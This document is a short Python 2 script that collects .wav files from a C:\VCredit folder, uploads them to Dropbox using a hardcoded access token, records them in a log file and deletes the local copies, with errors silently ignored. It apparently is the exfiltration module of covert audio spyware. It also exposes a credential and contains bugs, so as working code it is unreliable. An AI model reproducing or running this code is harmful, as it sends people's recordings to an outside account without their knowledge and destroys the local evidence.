import os, fnmatch
import dropbox
from colorama import init
from colorama import Fore, Back, Style


def find(pattern, path):
    result = []
    for root, dirs, files in os.walk(path):
        for name in files:
            if fnmatch.fnmatch(name, pattern):
                result.append(os.path.join(root, name))
    return result

reminder = find('*.wav','C:\\VCredit')
def send_data(files_list):
    n=0
    for rem in reminder:
        print rem
        file_to_open2 = 'C:\\VCredit\\liscence.txt'
        try:
            opp = open(file_to_open2,"r")
            opp2 = opp.readlines()
        except IOError as err:
            print err
            print "passing"+Fore.GREEN+ Style.BRIGHT +" Creating the txt file Cx"
            file2 = open(file_to_open2, "a")
            file2.write(rem)
        if rem not in opp2:
            try:
                client = dropbox.client.DropboxClient(
                    "-Vn5tIkNwIAAAAAAAAAAHDqBGcITyQrAUl7rAj09u4iIFZJuP3N1N5s2AdEvxOHm")
                print 'linked account: ', client.account_info()
                file_to_open = 'C:\\VCredit\\demo' + str(n) + '.wav'
                f = open(file_to_open, 'rb')
                response = client.put_file('/KLGD.wav', f)
                print 'uploaded: ', response
                folder_metadata = client.metadata('/')
                f, metadata = client.get_file_and_metadata('/demo.wav')
                file2 = open(file_to_open2, "a")
                file2.write(rem)
                file2.close()
                print "sent >>> deleting file: %s" %(rem)
                os.remove(rem)
                n += 1
            except:
                pass


send_data(reminder)
